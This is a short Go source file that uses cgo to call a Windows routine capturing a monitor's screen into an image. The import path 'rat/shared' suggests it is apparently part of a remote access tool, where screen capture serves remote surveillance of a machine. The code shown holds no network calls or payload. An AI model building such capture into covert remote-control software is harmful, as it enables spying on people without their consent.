package screen

/*
#cgo LDFLAGS: -lGdi32 -lgdiplus
#include <windows.h>
#include "screen.h"
#include "screen_windows.h"
*/
import "C"

import (
	"image"
	"rat/shared"
	"unsafe"
)

func Capture(monitor shared.Monitor) image.Image {
	m := cMonitor(monitor)

	image := C.CaptureMonitor(m)

	len := monitor.Width * monitor.Height * 4
	buf := C.GoBytes(unsafe.Pointer(image), C.int(len))

	return imageFromBitmap(buf, monitor.Width, monitor.Height)
}
